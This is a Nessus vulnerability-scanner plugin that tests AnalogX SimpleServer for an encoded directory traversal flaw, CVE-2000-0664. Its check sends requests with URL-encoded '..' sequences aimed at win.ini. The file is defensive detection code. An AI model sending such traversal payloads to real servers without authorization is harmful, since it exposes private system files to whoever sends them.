#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10489);
 script_version ("$Revision: 1.23 $");
 script_cve_id("CVE-2000-0664");
 script_bugtraq_id(1508);
 script_xref(name:"OSVDB", value:"388");
 
 script_name(english:"AnalogX SimpleServer:WWW Encoded Traversal Arbitrary File Access");
 script_summary(english:"Attempts a Directory Traversal");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a directory traversal." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of the AnalogX SimpleServer web
server that is affected by a directory traversal vulnerability. An
attacker could exploit this in order to read arbitrary files in the
context of the affected server." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to SimpleServer 1.07 or higher." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

server = get_http_banner(port:port);
if ( ! server || ( "AnalogX" >!< server && "Simple Server" >!< server) ) exit(0);

foreach d (make_list("windows", "winnt"))
{
 u = strcat("%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/", d, "/win.ini");
 if (check_win_dir_trav(port: port, url: u))
 {
   security_warning(port);
   exit(0);
 }
}
